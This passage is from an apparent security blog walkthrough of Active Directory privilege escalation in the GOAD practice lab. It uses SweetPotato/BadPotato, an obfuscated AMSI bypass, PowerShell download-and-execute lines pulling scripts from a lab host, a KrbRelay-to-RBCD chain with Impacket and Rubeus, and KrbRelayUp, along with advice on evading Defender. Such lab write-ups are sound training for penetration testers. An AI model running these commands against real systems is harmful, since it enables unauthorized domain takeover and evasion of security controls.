</span><span class="p">[</span><span class="n">SweetPotato.Program</span><span class="p">]::</span><span class="n">Main</span><span class="p">(@(</span><span class="s1">'-p=C:\temp\runme.bat'</span><span class="p">));[</span><span class="n">Console</span><span class="p">]::</span><span class="n">SetOut</span><span class="p">(</span><span class="nv">$out</span><span class="p">);</span><span class="nv">$sWriter</span><span class="o">.</span><span class="nf">ToString</span><span class="p">()</span><span class="w">
</span></pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/privesc_sweet_patatoes.png" alt="privesc_sweet_patatoes.png" /></p><ul><li><p>By default the tool use the <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">printSpoofer technic</a> by @itm4n</p><li><p>If you don’t want to compile sweet patatoes you could also do that with BadPotato from PowerSharpPack (but first we must bypass amsi -see the AMSI bypass part before- or it will be detected)</p></ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$x</span><span class="o">=</span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.Am'</span><span class="o">+</span><span class="s1">'siUt'</span><span class="o">+</span><span class="s1">'ils'</span><span class="p">);</span><span class="nv">$y</span><span class="o">=</span><span class="nv">$x</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'am'</span><span class="o">+</span><span class="s1">'siCon'</span><span class="o">+</span><span class="s1">'text'</span><span class="p">,[</span><span class="n">Reflection.BindingFlags</span><span class="p">]</span><span class="s1">'NonPublic,Static'</span><span class="p">);</span><span class="nv">$z</span><span class="o">=</span><span class="nv">$y</span><span class="o">.</span><span class="nf">GetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">);[</span><span class="n">Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">WriteInt32</span><span class="p">(</span><span class="nv">$z</span><span class="p">,</span><span class="mi">0</span><span class="n">x41424344</span><span class="p">)</span><span class="w">
</span><span class="n">iex</span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">system.net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://192.168.56.1:8080/amsi_rmouse.txt'</span><span class="p">)</span><span class="w">
</span><span class="n">iex</span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://192.168.56.1:8080/PowerSharpPack/PowerSharpBinaries/Invoke-BadPotato.ps1'</span><span class="p">)</span><span class="w">
</span><span class="n">Invoke-BadPotato</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"c:\temp\runme.bat"</span><span class="w">
</span></pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/privesc_invokebadpatatoes.png" alt="privesc_invokebadpatatoes.png" /></p><h3 id="krbrelay-up">KrbRelay Up</h3><ul><li>Another very useful technic to escalate privileges is kerberos relay, like implemented in <a href="https://github.com/Dec0ne/KrbRelayUp">KrbRelayUp</a><li>Thx to @dec0ne who use GOADv1 to demonstrate the technic on his tool :)<li>As KrbRelayUp is detected by defender, we will use the step by step approach like <a href="https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9">this writeup</a> by @an0n_r0, using @cube0x0 <a href="https://github.com/cube0x0/KrbRelay">KrbRelay</a><li><p>At the time of writing KrbRelay is not detected by defender.</p><li>The conditions to exploit this privesc is LDAP signing is NOT enforced, we can check that with cme ldap-signing module :</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> cme ldap 192.168.56.10-12 <span class="nt">-u</span> jon.snow <span class="nt">-p</span> iknownothing <span class="nt">-d</span> north.sevenkingdoms.local <span class="nt">-M</span> ldap-signing
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/privesc_ldap_signing.png" alt="privesc_ldap_signing.png" /></p><h4 id="add-computer-and-rbcd">Add computer and RBCD</h4><ul><li>To exploit krbrelay by adding a computer, you must be able to add new Computer, we can check that with cme MAQ module</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cme ldap 192.168.56.11 <span class="nt">-u</span> jon.snow <span class="nt">-p</span> iknownothing <span class="nt">-d</span> north.sevenkingdoms.local <span class="nt">-M</span> MAQ
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/privesc_ldap_maq.png" alt="privesc_ldap_maq.png" /></p><ul><li>Add computer :<div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>addcomputer.py <span class="nt">-computer-name</span> <span class="s1">'krbrelay$'</span> <span class="nt">-computer-pass</span> <span class="s1">'ComputerPassword'</span> <span class="nt">-dc-host</span> winterfell.north.sevenkingdoms.local <span class="nt">-domain-netbios</span> NORTH <span class="s1">'north.sevenkingdoms.local/jon.snow:iknownothing'</span>
</pre></table></code></div></div><li>Get the SID of that computer:<div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\jon.snow\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">ADSI</span><span class="p">]</span><span class="s2">"LDAP://CN=krbrelay,CN=Computers,DC=north,DC=sevenkingdoms,DC=local"</span><span class="p">)</span><span class="o">.</span><span class="nf">objectSID</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\jon.snow\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Security.Principal.SecurityIdentifier</span><span class="p">(</span><span class="nv">$o</span><span class="o">.</span><span class="nf">value</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="o">.</span><span class="nf">Value</span><span class="w">
</span><span class="n">S-1-5-21-3469228063-1577654746-3345322900-1127</span><span class="w">
</span></pre></table></code></div></div><li>Check ports</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\jon.snow\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\CheckPort.exe</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Looking</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">available</span><span class="w"> </span><span class="nx">ports..</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">SYSTEM</span><span class="w"> </span><span class="nx">Is</span><span class="w"> </span><span class="nx">allowed</span><span class="w"> </span><span class="nx">through</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="nx">443</span><span class="w">
</span></pre></table></code></div></div><ul><li>Launch krbrelay</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\jon.snow\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\KrbRelay.exe</span><span class="w"> </span><span class="nt">-spn</span><span class="w"> </span><span class="nx">ldap/winterfell.north.sevenkingdoms.local</span><span class="w"> </span><span class="nt">-clsid</span><span class="w"> </span><span class="nx">90f18417-f0f1-484e-9d3c-59dceee5dbd8</span><span class="w"> </span><span class="nt">-rbcd</span><span class="w"> </span><span class="nx">S-1-5-21-3469228063-1577654746-3345322900-1127</span><span class="w"> </span><span class="nt">-port</span><span class="w"> </span><span class="nx">443</span><span class="w">
</span></pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/privesc_krbrelay.png" alt="privesc_krbrelay.png" /></p><ul><li><p>Now we finish with RBCD exploitation</p><li><p>with Impacket :</p></ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>getTGT.py <span class="nt">-dc-ip</span> <span class="s1">'winterfell.north.sevenkingdoms.local'</span> <span class="s1">'north.sevenkingdoms.local'</span>/<span class="s1">'krbrelay$'</span>:<span class="s1">'ComputerPassword'</span>
<span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/workspace/krbrelay<span class="se">\$</span>.ccache
getST.py <span class="nt">-impersonate</span> <span class="s1">'administrator'</span> <span class="nt">-spn</span> <span class="s1">'CIFS/castelblack.north.sevenkingdoms.local'</span> <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> <span class="s1">'winterfell.north.sevenkingdoms.local'</span> <span class="s1">'north.sevenkingdoms.local'</span>/<span class="s1">'krbrelay$'</span>
<span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/workspace/administrator@CIFS_castelblack.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
wmiexec.py <span class="nt">-k</span> @castelblack.north.sevenkingdoms.local

C:<span class="se">\&gt;</span><span class="nb">whoami
</span>north<span class="se">\a</span>dministrator
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/privesc_krbrelay_rbcd_impacket.png" alt="privesc_krbrelay_rbcd_impacket.png" /></p><ul><li>Or with Rubeus</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$x</span><span class="o">=</span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.Am'</span><span class="o">+</span><span class="s1">'siUt'</span><span class="o">+</span><span class="s1">'ils'</span><span class="p">);</span><span class="nv">$y</span><span class="o">=</span><span class="nv">$x</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'am'</span><span class="o">+</span><span class="s1">'siCon'</span><span class="o">+</span><span class="s1">'text'</span><span class="p">,[</span><span class="n">Reflection.BindingFlags</span><span class="p">]</span><span class="s1">'NonPublic,Static'</span><span class="p">);</span><span class="nv">$z</span><span class="o">=</span><span class="nv">$y</span><span class="o">.</span><span class="nf">GetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">);[</span><span class="n">Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">WriteInt32</span><span class="p">(</span><span class="nv">$z</span><span class="p">,</span><span class="mi">0</span><span class="n">x41424344</span><span class="p">)</span><span class="w">
</span><span class="n">iex</span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">system.net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://192.168.56.1:8080/amsi_rmouse.txt'</span><span class="p">)</span><span class="w">
</span><span class="n">iex</span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://192.168.56.1:8080/PowerSharpPack/PowerSharpPack.ps1'</span><span class="p">)</span><span class="w">
</span><span class="n">PowerSharpPack</span><span class="w"> </span><span class="nt">-rubeus</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"hash /password:ComputerPassword"</span><span class="w">
</span><span class="n">PowerSharpPack</span><span class="w"> </span><span class="nt">-rubeus</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"s4u /user:krbrelay</span><span class="err">$</span><span class="s2"> /rc4:0EDDEDC35EB7B7ECDE0C9F0564E54C83 /impersonateuser:administrator /msdsspn:host/castelblack /ptt"</span><span class="w">
</span></pre></table></code></div></div><ul><li>And just like the writeup made by @an0n_r0 we launch <a href="https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82">SCMUACBypass.exe</a> by Tyranid and get a system shell</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/privesc_withrubeus.png" alt="privesc_withrubeus.png" /></p><ul><li>Without AV or if you modify/obfuscate KrbRelayUp you can do the all things with the following commands:<div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\KrbRelayUp.exe</span><span class="w"> </span><span class="nx">relay</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">north.sevenkingdoms.local</span><span class="w"> </span><span class="nt">-CreateNewComputerAccount</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">evilhost2</span><span class="err">$</span><span class="w"> </span><span class="nt">-ComputerPassword</span><span class="w"> </span><span class="nx">pass</span><span class="err">@</span><span class="nx">123</span><span class="w">
</span><span class="o">.</span><span class="n">/KrbRelayUp.exe</span><span class="w"> </span><span class="nx">spawn</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">rbcd</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">north.sevenkingdoms.local</span><span class="w"> </span><span class="nt">-dc</span><span class="w"> </span><span class="nx">winterfell.north.sevenkingdoms.local</span><span class="w"> </span><span class="nt">-cn</span><span class="w"> </span><span class="nx">evilhost2</span><span class="err">$</span><span class="w"> </span><span class="nt">-cp</span><span class="w"> </span><span class="nx">pass</span><span class="err">@</span><span class="nx">123</span><span class="w">
</span></pre></table></code></div></div></ul><h4 id="with-other-methods">With other methods</h4><ul><li>KrbRelay can also be used to relay to ADCS or to add msDS-KeyCredentialLink and exploit with ShadowCredentials. All you need to know is on <a href="https://github.com/Dec0ne/KrbRelayUp">this page</a>, this is leave as an exercice to the reader.<li>Start on braavos mssql and try to get a shell as admin :)</ul><h2 id="useful-links">Useful Links</h2><ul><li><a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a><li><a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/">https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/</a><li><a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">https://github.com/S3cur3Th1sSh1t/PowerSharpPack</a><li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">https://jlajara.gitlab.io/Potatoes_Windows_Privesc</a><li><a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/dotnet-reflective-assembly">https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/dotnet-reflective-assembly</a><li><a href="https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9">https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9</a><li><a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/</a><li><a href="https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html">https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html</a><li><a href="https://github.com/Dec0ne/KrbRelayUp">https://github.com/Dec0ne/KrbRelayUp)</a><li><a href="https://github.com/cube0x0/KrbRelay">https://github.com/cube0x0/KrbRelay</a></ul><p>Next time we will do a review on lateral movement technics inside an active directory.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ad/'>AD</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ad/" class="post-tag no-text-decoration" >AD,</a> <a href="/tags/lab/" class="post-tag no-text-decoration" >Lab,</a> <a href="/tags/amsi/" class="post-tag no-text-decoration" >AMSI,</a> <a href="/tags/krbrelay/" class="post-tag no-text-decoration" >krbrelay,</a> <a href="/tags/printspoofer/" class="post-tag no-text-decoration" >printspoofer</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=GOAD - part 8 - Privilege escalation - Mayfly&url=https://mayfly277.github.io/posts/GOADv2-pwning-part8/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=GOAD - part 8 - Privilege escalation - Mayfly&u=https://mayfly277.github.io/posts/GOADv2-pwning-part8/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=GOAD - part 8 - Privilege escalation - Mayfly&url=https://mayfly277.github.io/posts/GOADv2-pwning-part8/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/GOADv2-pwning_part1/">GOAD - part 1 - reconnaissance and scan</a><li><a href="/posts/GOADv2-pwning-part2/">GOAD - part 2 - find users</a><li><a href="/posts/GOADv2-pwning-part3/">GOAD - part 3 - enumeration with user</a><li><a href="/posts/GOADv2-pwning-part4/">GOAD - part 4 - poison and relay</a><li><a href="/posts/GOADv2-pwning-part5/">GOAD - part 5 - exploit with user</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ad/">AD,</a> <a class="post-tag" href="/tags/lab/">Lab,</a> <a class="post-tag" href="/tags/cme/">cme,</a> <a class="post-tag" href="/tags/adcs/">adcs</a> <a class="post-tag" href="/tags/amsi/">AMSI,</a> <a class="post-tag" href="/tags/bloodhound/">bloodhound</a> <a class="post-tag" href="/tags/certipy/">certipy,</a> <a class="post-tag" href="/tags/cve/">CVE,</a> <a class="post-tag" href="/tags/cve-2022-35914/">CVE-2022-35914</a> <a class="post-tag" href="/tags/cve/">CVE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/GOADv2-pwning_part1/"><div class="card-body"> <span class="timeago small" >Jul 3<i class="unloaded">2022-07-03T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 1 - reconnaissance and scan</h3><div class="text-muted small"><p> The lab is now up and running Goad introduction, let’s do some recon on it. Enumerate Network We will starting the reconnaissance of the Game Of Active Directory environment by searching all the ...</p></div></div></a></div><div class="card"> <a href="/posts/GOADv2-pwning-part2/"><div class="card-body"> <span class="timeago small" >Jul 4<i class="unloaded">2022-07-04T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 2 - find users</h3><div class="text-muted small"><p> We have done some basic reconnaissance on Goad pwning part1, now we will try to enumerate users and start to hunt credentials. Enumerate DC’s anonymously With CME cme smb 192.168.56.11 --users...</p></div></div></a></div><div class="card"> <a href="/posts/GOADv2-pwning-part3/"><div class="card-body"> <span class="timeago small" >Jul 7<i class="unloaded">2022-07-07T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 3 - enumeration with user</h3><div class="text-muted small"><p> We found some users on Goad pwning part2, now let see what we can do with those creds. User listing When you get an account on an active directory, the first thing to do is always getting th...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/GOADv2-pwning-part7/" class="btn btn-outline-primary" prompt="Older"><p>GOAD - part 7 - MSSQL</p></a> <a href="/posts/GLPI-htmlawed-CVE-2022-35914/" class="btn btn-outline-primary" prompt="Newer"><p>GLPI htmlawed (CVE-2022-35914)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/M4yFly">mayfly</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ad/">AD,</a> <a class="post-tag" href="/tags/lab/">Lab,</a> <a class="post-tag" href="/tags/cme/">cme,</a> <a class="post-tag" href="/tags/adcs/">adcs</a> <a class="post-tag" href="/tags/amsi/">AMSI,</a> <a class="post-tag" href="/tags/bloodhound/">bloodhound</a> <a class="post-tag" href="/tags/certipy/">certipy,</a> <a class="post-tag" href="/tags/cve/">CVE,</a> <a class="post-tag" href="/tags/cve-2022-35914/">CVE 2022 35914</a> <a class="post-tag" href="/tags/cve/">CVE</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
